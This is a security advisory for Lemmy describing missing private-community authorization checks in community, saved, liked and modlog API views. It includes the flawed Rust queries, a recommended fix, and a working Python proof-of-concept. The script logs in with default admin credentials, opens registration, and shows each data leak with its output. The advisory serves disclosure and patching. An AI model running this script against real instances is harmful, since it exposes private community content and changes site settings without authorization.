# [M] Lemmy may expose private community data through community, saved, liked, and modlog API views

## Summary
Severity: Medium
Advisory: GHSA-95q8-x6r6-672m
CWE: CWE-862
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-95q8-x6r6-672m
Type: github-advisory

## Affected
- crates.io: `lemmy_api` — affected >=0

## Details
**NOTE**: Only affects development version.

## Summary

Lemmy applies private-community checks in `PostView` and `CommentView`, but several adjacent API views skip the accepted-follower filter. Bob, a registered user who is not an accepted follower, can read private community `sidebar` and `summary` fields. Alice, a former accepted follower, can still read saved and liked private post bodies after she leaves. An unauthenticated visitor can read private community metadata and removed private post names through the modlog.

## Details

`CommunityView::read()` and `CommunityQuery::list()` call `visible_communities_only()`, but they do not add the private-community filter used by post and comment reads:

```rust
query = my_local_user.visible_communities_only(query);
query.first(conn).await.with_lemmy_type(LemmyErrorType::NotFound)
```

`PersonSavedCombinedQuery::list()` and `PersonLikedCombinedQuery::list()` join `community_actions`, but they only filter by the requesting person id. They do not require `community_actions.follow_state = Accepted` when the community has `visibility = Private`.

The modlog query returns `ListingType::All` without a visibility predicate:

```rust
query = match self.listing_type.unwrap_or(ListingType::All) {
  ListingType::All => query,
```

The control paths show the expected check. `PostView::read()` and `CommentView::read()` both filter private communities to accepted followers:

```rust
community::visibility
  .ne(CommunityVisibility::Private)
  .or(community_actions::follow_state.eq(CommunityFollowerState::Accepted))
```

## Proof of Concept

The following script reproduces the leak against a fresh Lemmy instance. Tested against `dessalines/lemmy:nightly` with the default setup account from the sample config. The script opens registration so it can create Alice and Bob.

```python
import requests, random, string

BASE = "http://127.0.0.1:8536/api/v4"  # change to the target Lemmy URL
ADMIN_USER = "lemmy"
ADMIN_PASS = "lemmylemmy"
PASSWORD = "Password123456!"

def req(method, path, token=None, params=None, **body):
    headers = {}
    if token:
        headers["Authorization"] = "Bearer " + token
    return requests.request(method, BASE + path, headers=headers, params=params, json=body or None)

def register(name):
    r = req("POST", "/account/auth/register", username=name, password=PASSWORD,
            password_verify=PASSWORD, email=name + "@example.test")
    r.raise_for_status()
    token = r.json()["jwt"]
    person_id = req("GET", "/account", token).json()["local_user_view"]["person"]["id"]
    return token, person_id

def show(label, response, marker):
    text = response.text
    print("\n" + label + ": HTTP", response.status_code)
    print(text[:700])
    print("contains marker:", marker in text)

suffix = "poc" + "".join(random.choice(string.ascii_lowercase) for _ in range(6))
admin = req("POST", "/account/auth/login", username_or_email=ADMIN_USER, password=ADMIN_PASS).json()["jwt"]
req("PUT", "/site", admin, registration_mode="open", email_verification_required=False)

alice, alice_id = register("alice" + suffix)
bob, _ = register("bob" + suffix)
secret = "SECRET_" + suffix

community = req("POST", "/community", admin,
                name="priv" + suffix,
                title="Private Proof " + suffix,
                sidebar=secret + " sidebar",
                summary=secret + " summary",
                visibility="private").json()["community_view"]["community"]
community_id = community["id"]
post = req("POST", "/post", admin, name="secret post " + suffix,
           community_id=community_id, body=secret + " post body").json()["post_view"]["post"]
post_id = post["id"]

show("Bob reads private community metadata", req("GET", "/community", bob, params={"id": community_id}), secret)
show("Bob direct post read control", req("GET", "/post", bob, params={"id": post_id}), secret)

req("POST", "/community/follow", alice, community_id=community_id, follow=True)
req("POST", "/community/pending_follows/approve", admin,
    community_id=community_id, follower_id=alice_id, approve=True)
req("PUT", "/post/save", alice, post_id=post_id, save=True)
req("POST", "/post/like", alice, post_id=post_id, is_upvote=True)
req("POST", "/community/follow", alice, community_id=community_id, follow=False)

show("Alice direct post read after leaving", req("GET", "/post", alice, params={"id": post_id}), secret)
show("Alice saved list after leaving", req("GET", "/account/saved", alice), secret)
show("Alice liked list after leaving", req("GET", "/account/liked", alice), secret)

mod_comm = req("POST", "/community", admin,
               name="modlog" + suffix,
               title="Private Modlog " + suffix,
               sidebar=secret + " modlog sidebar",
               summary=secret + " modlog summary",
               visibility="private").json()["community_view"]["community"]
mod_post = req("POST", "/post", admin, name=secret + " removed post",
               community_id=mod_comm["id"], body="body").json()["post_view"]["post"]
req("POST", "/post/remove", admin, post_id=mod_post["id"], removed=True, reason="poc")
show("Unauthenticated modlog", req("GET", "/modlog", params={"listing_type": "all", "limit": 50}), secret)

```

Output:

```text
Bob reads private community metadata: HTTP 200
contains marker: True
Bob direct post read control: HTTP 404
contains marker: False
Alice direct post read after leaving: HTTP 404
contains marker: False
Alice saved list after leaving: HTTP 200
contains marker: True
Alice liked list after leaving: HTTP 200
contains marker: True
Unauthenticated modlog: HTTP 200
contains marker: True
```

## Impact

Bob can read private community descriptions and sidebars before a moderator approves him. Alice can leave a private community, or a moderator can remove her, and Lemmy still returns private post bodies that Alice saved or liked while she was a member. An unauthenticated visitor can use the public modlog to discover private community metadata and removed private post names.

## Recommended Fix

Apply the same private-community filter used by `PostView` and `CommentView` to `CommunityView::read()`, `CommunityQuery::list()`, `PersonSavedCombinedQuery::list()`, `PersonLikedCombinedQuery::list()`, and the `ListingType::All` branch of the modlog query. Admins and accepted followers should keep access. Other callers should receive the same `404` behavior as `GET /post` and `GET /comment`.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/LemmyNet/lemmy/security/advisories/GHSA-95q8-x6r6-672m
- https://github.com/LemmyNet/lemmy/commit/637151121a8e27b2b8c95e98d6f86966b31b4a6d
- https://github.com/LemmyNet/lemmy
